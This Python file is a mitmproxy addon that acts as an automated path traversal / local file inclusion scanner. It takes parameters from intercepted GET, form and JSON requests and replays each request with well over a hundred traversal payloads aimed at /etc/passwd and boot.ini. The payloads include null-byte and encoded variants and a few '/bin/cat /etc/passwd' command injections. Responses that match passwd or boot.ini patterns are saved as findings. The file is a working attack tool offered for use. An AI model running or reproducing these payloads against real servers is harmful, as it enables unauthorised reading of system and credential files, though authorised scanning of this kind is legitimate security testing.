from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor

class Alterlfi:
    def __init__(self):
        self.flow_dir_lfi = "lfi_flows"
        os.makedirs(self.flow_dir_lfi, exist_ok=True)
        self.alteration_indicators_lfi = ["/etc/passwd%2500", "/etc/passwd%00", "/etc/passwd", "///etc///passwd%2500", "///etc///passwd%00", "///etc///passwd", "../etc/passwd%2500", "../etc/passwd%00", "../etc/passwd", "..///etc///passwd%2500", "..///etc///passwd%00", "..///etc///passwd", "..///..///etc///passwd%2500", "..///..///etc///passwd%00", "..///..///etc///passwd", "..///..///..///etc///passwd%2500", "..///..///..///etc///passwd%00", "..///..///..///etc///passwd", "..///..///..///..///etc///passwd%2500", "..///..///..///..///etc///passwd%00", "..///..///..///..///etc///passwd", "..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///..///..///etc///passwd", "../../etc/passwd%2500", "../../etc/passwd%00", "../../etc/passwd", "../../../etc/passwd%2500", "../../../etc/passwd%00", "../../../etc/passwd", "../../../../etc/passwd%2500", "../../../../etc/passwd%00", "../../../../etc/passwd%00", "../../../../etc/passwd", "../../../../../etc/passwd%00", "../../../../../etc/passwd", "../../../../../../etc/passwd%2500", "../../../../../../etc/passwd%00", "../../../../../../etc/passwd", "../../../../../../../etc/passwd%2500", "../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd%2500", "../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd", "\\etc\\passwd%2500", "\\etc\\passwd%00", "\\etc\\passwd", "..\\etc\\passwd%2500", "..\\etc\\passwd%00", "..\\etc\\passwd", "..\\..\\etc\\passwd%2500", "..\\..\\etc\\passwd%00", "..\\..\\etc\\passwd", "..\\..\\..\\etc\\passwd%2500", "..\\..\\..\\etc\\passwd%00", "..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\etc\\passwd%2500", "..\\..\\..\\..\\etc\\passwd%00", "..\\..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\..\\etc\\passwd%2500", "..\\..\\..\\..\\..\\etc\\passwd%00", "..\\..\\..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\..\\..\\etc\\passwd%2500", "..\\..\\..\\..\\..\\..\\etc\\passwd%00", "..\\..\\..\\..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\..\\..\\..\\etc\\passwd%2500", "..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00", "..\\..\\..\\..\\..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%2500", "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00", "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd", "%00../../../../../../etc/passwd", "%00/etc/passwd%00", "%0a/bin/cat%20/etc/passwd", "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "\\\\'/bin/cat%20/etc/passwd\\\\'", "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd", "/etc/default/passwd", "/etc/master.passwd", "././././././././././././etc/passwd", ".//.//.//.//.//.//.//.//.//.//.//.//etc//passwd", "/./././././././././././etc/passwd", "/../../../../../../../../../../etc/passwd", "/../../../../../../../../../../etc/passwd^^", "/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd", "/etc/passwd", "../../../../../../../../../../../../etc/passwd", "../../../../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd", "../../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd", "../../../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../etc/passwd", "../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd", "../etc/passwd", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd", ".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd", "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd", "etc/passwd", "/etc/passwd%00", "../../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../etc/passwd%00", "../../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../etc/passwd%00", "../../../../etc/passwd%00", "../../../etc/passwd%00", "../../etc/passwd%00", "../etc/passwd%00", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00", "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00", "/../../../../../../../../../../../etc/passwd%00.html", "/../../../../../../../../../../../etc/passwd%00.jpg", "../../../../../../etc/passwd&=%3C%3C%3C%3C", "..2fetc2fpasswd", "..2fetc2fpasswd%00", "..2f..2fetc2fpasswd", "..2f..2fetc2fpasswd%00", "..2f..2f..2fetc2fpasswd", "..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini", "..\\../..\\../..\\../..\\../..\\../..\\../boot.ini", "/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./boot.ini", "..//..//..//..//..//boot.ini", "../../../../../../../../../../../../boot.ini", "../../boot.ini", "..\\../..\\../..\\../..\\../boot.ini", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", "../../../../../../../../../../../../boot.ini%00", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%00", "/../../../../../../../../../../../boot.ini%00.html", "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini", "C:/boot.ini", "C:\\boot.ini", "../../../../../../../../../../../../boot.ini#", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini#", "../../../../../../../../../../../boot.ini#.html"]
        self.altered_header_lfi = "x-altered-lfi"

    def response(self, flow: http.HTTPFlow) -> None:

        if self.altered_header_lfi in flow.request.headers:
            self.check_altered_reflection_lfi(flow)
            return

        if flow.request.method == "GET":
            self.process_parameters_lfi(flow, flow.request.query)
        elif flow.request.method == "POST":
            self.process_post_request_lfi(flow)

    def process_post_request_lfi(self, flow):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters_lfi(flow, params)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters_lfi(flow, params)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters_lfi(self, flow, params):
        def process_value(param, value):
            
            if isinstance(value, str):
                self.escaped_value = value
                # Your existing logic for using escaped_value
            elif isinstance(value, list):
                # If the value is a list, process each item
                value = value[0]
                self.escaped_value = value
            elif isinstance(value, dict):
                # If the value is a dict, recursively process each key-value pair
                for key, val in value.items():
                    process_value(f"{param}[{key}]", val)  # Adjust the param name as needed
                    self.escaped_value = val
            else:
                # Optionally handle other non-string types or log them
                value = str(value)
                ctx.log.info(f"Unhandled value type for param '{param}': {type(value)}")
            
                # Define patterns to search for in the response body
            
            
            
        for param, value in params.items():

            process_value(param, value)

            url_pattern = r'(\w+:\/\/[^\s]+|\/[^?#\s]*(?=[?#\s]|$))'

            if re.search(url_pattern, self.escaped_value):
                self.handle_reflection(flow, param, value)
            

    def handle_reflection(self, flow, param, value):
        with ThreadPoolExecutor(max_workers=100) as executor:

            for template in self.alteration_indicators_lfi:
                altered_value = template
                altered_flow = self.alter_request_lfi(flow, param, altered_value)

                if altered_flow:

                    ctx.master.commands.call("replay.client", [altered_flow])
                    # The response handling is now managed by the check_vulnerability method

    def alter_request_lfi(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if isinstance(body, dict):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header_lfi] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_lfi(self, flow):
        
        response_text = flow.response.get_text()
        redirect_patterns = [
            r'^(.+?):(.+?):(\d+):(\d+):(.*?):(\/.+?):(\/.+?)$',
            r'^multi\(.*\)="(.+)" /.*$',
            r'^default=multi\(.*\)$',
        ]
        for pattern in redirect_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                kind = "regex"
                self.save_flow_lfi(flow, kind)
                break

    def save_flow_lfi(self, flow, kind):
        identifier = f"{kind}_{flow.request.method}_{flow.request.host}".replace("/", "_")
        filename = os.path.join(self.flow_dir_lfi, f"{identifier}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"lfi throught {kind} detected and saved in {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [Alterlfi()]

